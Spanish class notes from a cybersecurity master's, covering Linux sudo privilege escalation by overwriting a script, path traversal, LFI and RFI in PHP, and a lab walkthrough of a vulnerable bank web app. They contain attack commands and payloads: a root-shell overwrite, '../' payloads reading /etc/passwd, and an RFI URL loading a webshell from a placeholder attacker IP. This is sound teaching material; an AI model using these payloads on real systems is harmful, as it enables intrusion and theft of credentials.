> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 41**
> **Módulo:** MODULO3
> **Tema:** Clase 41
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 41. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesión

Esta sesión la imparte **Carlos (Dani)**.

La clase tiene dos grandes bloques:

1. **Repaso y consolidación** de los conceptos de la semana: permisos Linux, escalada de privilegios por sobreescritura de binario, Path Traversal y LFI, con demos en vivo. 2. **Práctica** con la **Máquina del Banco** --- una web con un portal de login donde el objetivo es encontrar credenciales, explotar un LFI y obtener RCE.

**Marco pedagógico del módulo:** Carlos explica por qué se mezclan conceptos de escalada de privilegios dentro del módulo de hacking web --- porque los servers web siempre corren como cuentas de servicio (`www-data`) y siempre habrá que escalar.

Entender ambas cosas juntas es la forma correcta de aprender.

**Objetivo del módulo:** no ser "chimpancés lanzando comandos", sino entender el **por qué** de cada paso.

## 2.

Repaso: permisos Linux y escalada por sobreescritura de binario

Pablo expone ante el grupo (como repaso) el sistema de permisos de Linux --- lo que vimos en detalle en la Clase 40.

Carlos va puntualizando:

### Regla de oro que hay que grabar a fuego

> **Si tienes permiso de escritura sobre un fichero que puedes ejecutar como otro usuario (vía** `sudo -l`**), tienes escalada de privilegios garantizada.**

### Demostración práctica paso a paso

# 1.

Ver lo que podemos ejecutar como otro usuario:

```bash
sudo -l
```

# → (root) NOPASSWD: /usr/bin/python /home/pablo/hola.py

# 2.

Leer el script para saber qué hace:

```bash
cat /home/pablo/hola.py
```

# → import os; os.system('bash')

# 3.

Si tenemos escritura sobre hola.py:

```bash
ls -lh /home/pablo/hola.py
```

# → -rwxrwxr-x → grupo tiene escritura (w)

# 4.

Sobreescribir con nuestra shell:

```bash
echo '/bin/bash' > /home/pablo/hola.py
```

# 5.

Ejecutar como root:

```bash
sudo /usr/bin/python /home/pablo/hola.py
```

# → whoami: root

**La diferencia entre** `>` **y** `>>`**:** - `>` → **sobrescribe** el contenido completo del fichero. - `>>` → **añade** al final del fichero sin borrar lo anterior.

En este ataque usamos `>` para eliminar el script original y poner solo nuestra llamada a bash.

**Analogía:** si puedo ir a casa de Charchas y pedir comida haciéndome pasar por él, me la dan.

Pero si además puedo cambiar el menú antes de pedirlo, en vez de lo que hay pido lo que quiero.

Eso es exactamente lo que hacemos con el binario.

## 3.

Path Traversal y LFI --- explicación completa con demo

### ¿Qué es un Path?

Un **path** (ruta) es la dirección completa de un fichero o directorio en el sistema de ficheros:

/etc/hosts → path absoluto (desde la raíz) ./hola.py → path relativo (desde el directorio actual) /var/www/html/index.php → path al fichero PHP del servidor web

### ¿Qué es el Path Traversal?

**Path Traversal** es una vulnerabilidad que ocurre cuando una aplicación permite que el usuario **controle un path** sin validarlo correctamente, permitiéndole navegar fuera del directorio autorizado usando la secuencia `../`.

**Demostración en bash (para entender el concepto):**

# Estamos en /home/kali/Desktop

```bash
cd ../../../../../../../../../../Desktop
```

# → Sigue en /home/kali/Desktop (Linux para cuando llega a la raíz)

El número de `../` no importa mientras sean suficientes --- el sistema no puede ir más atrás de la raíz `/`.

Por eso en los payloads de Path Traversal se ponen muchos `../` para garantizar llegar a la raíz sin importar la profundidad real del directorio actual.

Carlos usó 9 porque es la ruta más profunda que encontró en un servidor web real.

### ¿Cómo se produce el LFI?

**LFI** (*Local File Inclusion*) es la **consecuencia** del Path Traversal cuando el parámetro vulnerable se usa para **incluir o leer ficheros** del sistema.

**Código PHP vulnerable:**

// Código VULNERABLE (sin validación): $basedir = '/var/www/html/ficheros/'; $nombre = $_GET['file']; // El usuario controla este valor $contenido = file_get_contents($basedir . $nombre); // Lee sin filtrar echo $contenido;

Si el usuario pasa `file=../../../../etc/passwd`, el servidor ejecuta:

file_get_contents('/var/www/html/ficheros/../../../../etc/passwd'); // = file_get_contents('/etc/passwd') → devuelve el fichero de usuarios

**Código PHP seguro:**

// Código SEGURO (con validación): $basedir = '/var/www/html/ficheros/'; $nombre = basename($_GET['file']); // basename() elimina ../ if (file_exists($basedir . $nombre)) { echo file_get_contents($basedir . $nombre); }

`basename()` extrae solo el nombre del fichero sin la ruta, eliminando cualquier intento de traversal.

### Diferencia entre Path Traversal, LFI e IDOR

Vulnerabilidad ¿Qué hace?

Vector
 -------------------- ---------------------------------------------------------------------- --------------------------------
 **Path Traversal** Navegar fuera del directorio permitido con `../` Parámetro con ruta de fichero
 **LFI** Leer ficheros locales del servidor (consecuencia del Path Traversal) Parámetro con nombre de fichero
 **IDOR** Acceder a objetos de otros usuarios cambiando un ID Parámetro con ID numérico

**La diferencia clave en la URL:** - `?fichero=/media/content/2026/estados.pdf` → ruta hardcodeada, **no vulnerable a Path Traversal**. - `?fichero=estados.pdf` → variable controlable → **potencialmente vulnerable a LFI**. - `?id=3` → identificador → **potencialmente vulnerable a IDOR**.

### RFI --- Remote File Inclusion

**RFI** (*Remote File Inclusion*) es la variante de LFI donde en vez de leer un fichero local se **carga un fichero de un servidor remoto** (del atacante):

?fichero=http://IP_ATACANTE/shell.php

El servidor víctima hace una petición al servidor del atacante, descarga el PHP y lo ejecuta.

Si el atacante tiene un `php -S` o `python3 -m http.server` levantado, sirve la webshell.

**Conexión con la Máquina Responder (HTB Tier 1):** en aquella máquina, se usó exactamente esta técnica --- el parámetro `?page=` cargaba ficheros y se le pasó una ruta UNC (`//IP_ATACANTE/carpeta`) para forzar la conexión hacia el atacante y capturar el hash NTLM con Responder.

**La diferencia entre LFI y RFI:** - LFI → fichero **local** del servidor: `../../../../etc/passwd` - RFI → fichero **remoto**: `http://ip_atacante/shell.php`

## 4.

Máquina del Banco --- flujo completo

La máquina tiene un panel de login de un banco.

El contexto narrativo: alguien ha conseguido acceso a la WiFi interna del banco (via rouge AP o phishing) y está intentando comprometer la infraestructura interna.

### Paso 1 --- Reconocimiento inicial

netdiscover -r 10.0.2.0/24 # Descubrir la IP de la máquina nmap -sCV -Pn --min-rate 1000 IP # Escanear puertos

### Puertos encontrados: - **Puerto 22** (SSH) → sin credenciales, no útil de momento. - **Puerto 80** (HTTP, Apache 2.4.66) → panel de login de un banco.

### Paso 2 --- Fingerprinting con Wappalyzer

### Wappalyzer detecta: Debian, Apache 2.4.66.

**Buscar CVEs de Apache 2.4.66 → descartar todos:**

Al buscar CVEs de esta versión de Apache, aparecen: - Mod LDAP → requiere AD configurado.

No hay AD. - XSS reflejado con proxy → solo útil con otro usuario activo.

Solo hay uno. - Buffer Overflow → no sabemos explotar buffer overflow. - CVEs de 2014 → la máquina es reciente.

**Conclusión:** ningún CVE de Apache útil en este contexto.

Seguir adelante.

### Paso 3 --- Código fuente (¡hallazgo crítico!)

`Ctrl+U` → Ver código fuente de la página de login.

Al inspeccionar el JavaScript en el código fuente, **Sira** encontró credenciales **hardcodeadas** directamente en el código frontend:

// Código del formulario de login: if (usuario === 'admin' && password === 'CONTRASEÑA_HARDCODEADA') { // acceso permitido }

> [!important] **Lección clave:** el código fuente del frontend es público --- cualquiera puede verlo.

Un desarrollador que pone credenciales en el JavaScript está dejando las llaves de casa en el felpudo.

**Carlos cita el caso real de Renfe:** una web española donde las contraseñas estaban en el código fuente.

Es más frecuente de lo que parece, especialmente en sistemas legacy.

Con las credenciales → **acceso al panel autenticado**.

### Paso 4 --- Explorar el panel autenticado

> [!important] **Principio importante:** al autenticarse, el contexto cambia.

El código fuente del panel es nuevo, los directorios disponibles son nuevos.

Hay que repetir todo el proceso de reconocimiento dentro del área autenticada.

En el panel hay un **botón de descarga de PDF** (estados financieros).

Al revisar el código fuente del panel:

<form method="POST" action="descargar.php"> <input type="hidden" name="archivo" value="sobre_nosotros.pdf"> <button type="submit">Descargar</button> </form>

**Hallazgo:** hay un fichero `descargar.php` que recibe un parámetro `archivo` vía POST.

### Paso 5 --- Interceptar la petición con Burp Suite + Repeater

## 1.

Activar FoxyProxy → Burp Suite con Intercept ON 2.

Clicar el botón de descarga 3.

La petición queda capturada en Burp 4.

Clic derecho → Send to Repeater (Ctrl+R) 5.

En Repeater → modificar el parámetro antes de enviar

**En el Repeater**, al enviar la petición y ver la respuesta, el código fuente de `descargar.php` incluía un **comentario del desarrollador** que decía literalmente:

// Punto crítico de vulnerabilidad LFI // Concatenamos directamente la entrada del usuario sin validar la ruta // Un atacante puede usar Path Traversal: ../../etc/passwd

El código de `descargar.php` concatenaba directamente el input sin `basename()`.

### Paso 6 --- Explotar el LFI

En el campo `archivo` del Repeater:

archivo=../../../../../../../../etc/passwd

**Resultado:** el servidor devolvió el contenido del `/etc/passwd` completo.

**Identificar usuarios reales** (los que tienen `/bin/bash`): - `www-data` → cuenta de servicio del web server. - `VBRs` → usuario real. - `root` → el objetivo final.

### Paso 7 --- Ficheros PHP comunes a buscar

Con el LFI confirmado, los ficheros más interesantes a leer en un servidor PHP son:

Fichero Información que contiene
 ----------------- ----------------------------------------------------------------------------
 `/etc/passwd` Usuarios del sistema
 `/etc/shadow` Hashes de contraseñas (si tenemos permisos)
 `config.php` Credenciales de base de datos hardcodeadas
 `php.ini` Configuración de PHP (ej. si `allow_url_include` está activo → RFI posible)
 `phpinfo.php` Configuración completa de PHP, versión, módulos
 `index.php` Código fuente del index (puede tener lógica de negocio)
 `descargar.php` En este caso, código con el LFI y el comentario del desarrollador

**Ficheros de configuración de bases de datos comunes:**

config.php, database.php, db.php, connection.php, settings.php

## 5.

Burp Suite Repeater --- uso práctico

El **Repeater** permite enviar una petición HTTP manualmente tantas veces como se quiera, modificando los parámetros en cada envío, sin necesidad de interceptar en tiempo real.

**Flujo para usar el Repeater en un LFI:**

## 1.

Interceptar cualquier petición con Burp (Intercept ON) 2.

Clic derecho sobre la petición → Send to Repeater (o Ctrl+R) 3.

En la pestaña Repeater:
 - Panel izquierdo: la petición (modificable)
 - Panel derecho: la respuesta del servidor

## 4.

Modificar el parámetro en el cuerpo de la petición: archivo=../../../../etc/passwd 5.

Clic en "Send" (el botón naranja) 6.

Ver la respuesta en el panel derecho 7.

Repetir cambiando el payload cuantas veces sea necesario

**Por qué Repeater y no Proxy/Intercept para esto:** - Con Intercept habría que reenviar cada petición una a una y saltar al navegador. - Con Repeater todo ocurre en Burp, es más rápido para iterar payloads.

**Atajo de teclado:** `Ctrl+Shift+G` o el botón "Send" en la interfaz.

## 6.

Dirsearch en paralelo --- siempre lanzar en segundo plano

Una vez vista la web y comenzado el reconocimiento manual, siempre lanzar el dirsearch **en paralelo** sin esperar a que termine:

dirsearch -u http://IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt &

# El & lo envía a segundo plano

Mientras se analiza el código fuente o se prueba el login, dirsearch va descubriendo directorios en paralelo.

Es un ejemplo de multitasking efectivo en pentesting.

## 7.

Metodología consolidada para cualquier web

1. nmap → identificar puertos y tecnologías 2.

Abrir la web → Wappalyzer → fingerprinting 3.

Buscar CVEs de la tecnología encontrada → descartar los no aplicables 4.

Ver el código fuente (Ctrl+U) → buscar:
 - Credenciales hardcodeadas en JS
 - Comentarios de desarrolladores
 - Rutas y ficheros PHP referenciados
 - Campos input type="hidden"

## 5.

Lanzar dirsearch en paralelo 6.

Interactuar con la web: login, buscadores, formularios, descargas 7.

Interceptar peticiones interesantes con Burp 8.

Identificar parámetros modificables → probar LFI, SQLi, IDOR... 9.

Si el login tiene éxito → repetir todo desde el paso 2 en el área autenticada

## 8.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
-------------------------------------------------------- --------------------------------------------------------------------------------------------------------------------------------------
 *Path transversal / pad transversal / paz transversal* **Path Traversal** -- vulnerabilidad que usa `../` para navegar fuera del directorio permitido
 *local find inclusing / LFI* **LFI** (*Local File Inclusion*) -- consecuencia del Path Traversal; permite leer ficheros locales del servidor
 *RFI / Remote Find / R FI* **RFI** (*Remote File Inclusion*) -- variante del LFI que carga ficheros desde un servidor remoto
 *punto punto barra / la de ir para atrás* `../` -- secuencia de Path Traversal para subir un nivel en el árbol de directorios
 *file open / file close / file get* `file_get_contents()` -- función PHP para leer el contenido de un fichero
 *base name / base del nombre* `basename()` -- función PHP que extrae solo el nombre del fichero sin la ruta; defensa contra Path Traversal
*Hardcoreado / hard-coded / hardcodiao* **Hardcodeado** (*hardcoded*) -- valor escrito directamente en el código en vez de en una configuración externa
 *Burnswip / Burps / bursuite* **Burp Suite** -- framework de auditoría web (proxy, repeater, intruder...)
 *repetiter / el repetir / el Repeter* **Repeater** -- módulo de Burp Suite para enviar peticiones modificadas manualmente
 *Ctrl R / control R* **Ctrl+R** -- atajo de teclado para enviar la petición seleccionada al Repeater en Burp
*hidden / Hiden / haiden / hyden* `<input type="hidden">` -- campo HTML oculto que envía parámetros sin que el usuario los vea; muy relevante para Path Traversal
 *descargar punto PHP / el que descarga* `descargar.php` -- fichero PHP vulnerable a LFI encontrado en la máquina del banco
 *PHP info / PHP ini / PHP my admin* `phpinfo.php` / `php.ini` / **phpMyAdmin** -- ficheros comunes en servidores PHP
 *Wappalizer / Wupalizer* **Wappalyzer** -- extensión del navegador para detectar tecnologías web
 *Deep Sertain / deerSarch / dissearch* **dirsearch** -- herramienta de fuzzing de directorios web
 *IDOR / Idol* **IDOR** (*Insecure Direct Object Reference*) -- acceso a objetos de otros usuarios cambiando un ID en la URL
*credenciales de Active Directory / el LDAP* **Active Directory / LDAP** -- servicios de directorio de Microsoft; CVE relacionado con Apache LDAP solo aplica si la máquina usa AD
 *Claudia / Claude / la IA* **Claude** (Anthropic) -- IA consultada en clase para obtener zoom en Burp y buscar exploits
*Python HTTP / python m server / el de los ficheros* `python3 -m http.server` -- servidor HTTP simple para servir ficheros en RFI o transferencias de herramientas
 *Physing 4 / phishing 4* **Evilginx** / phishing AiTM de 2ª generación que bypasea 2FA y roba la cookie de sesión
 *Rogue AP / wifi rogueado* **Rogue AP** -- punto de acceso WiFi falso que suplanta a uno legítimo para interceptar tráfico

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../transcripciones/Julio/08.07.2026 Owasp Top 10 LFI Fundamentos.md|08.07.2026 Owasp Top 10 LFI Fundamentos]] — Burp Suite, Hack The Box, SSH
- [[../../apuntes Chema/OWASP API Top 10 Labs.md|OWASP API Top 10 Labs]] — Post-Explotación, SQL Injection, XXE
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]] — Burp Suite, Metodología Pentest, SSH
- [[../../transcripciones/Julio/07.07.2026 Explotación Avanzada Fuzzing de Parámetros II y Escalada de Privilegios MultiPivote.md|07.07.2026 Explotación Avanzada Fuzzing de Parámetros II y Escalada de Privilegios MultiPivote]] — Burp Suite, Hack The Box, SSH
- [[../../transcripciones/Julio/09.07.2026 Owasp Top 10 XXE  Labs with Castor.md|09.07.2026 Owasp Top 10 XXE  Labs with Castor]] — Burp Suite, Hack The Box, SSH
- [[../../apuntes Andres/09.07.2026 XXE - XML External Entity y Máquina Castor.md|09.07.2026 XXE - XML External Entity y Máquina Castor]] — RFI, SQL Injection, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/DirSearch|DirSearch]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #command-injection #dirsearch #escalada-privilegios #file-upload #hack-the-box #ia #idor #kali #lfi #linux #netcat #nmap #pentest #post-explotacion #redes #reverse-shell #rfi #sqli #ssh #wifi #windows #xss #xxe
